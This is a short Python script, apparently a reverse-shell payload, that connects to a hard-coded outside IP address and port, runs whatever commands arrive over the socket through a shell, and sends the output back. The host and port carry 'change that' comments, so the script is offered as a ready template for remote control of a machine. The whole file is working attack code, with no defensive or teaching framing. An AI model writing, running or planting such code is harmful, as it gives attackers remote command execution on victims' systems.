import os 
import subprocess
import socket



RHOST = "51.77.159.168" #change that
RPORT = 1235 #change that!

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
#s.send("[*]payload started...".encode())
while True:
    command = s.recv(1024)
    if command.lower() == "exit":
        break 
    if command[:2].decode('utf-8') == 'cd': #change directorie
        os.chdir(command[3:].decode("utf-8"))
       

  
    if len(command) > 0:
        cmd = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        outpout_bytes = cmd.stdout.read() + cmd.stderr.read()
        outpout_str = str(outpout_bytes, "ascii", errors="ignore")
        #s.send(str.encode(outpout_str + "\n" + str(os.getcwd())))
        s.send(str.encode(outpout_str + "\n"))
s.close()

s.close()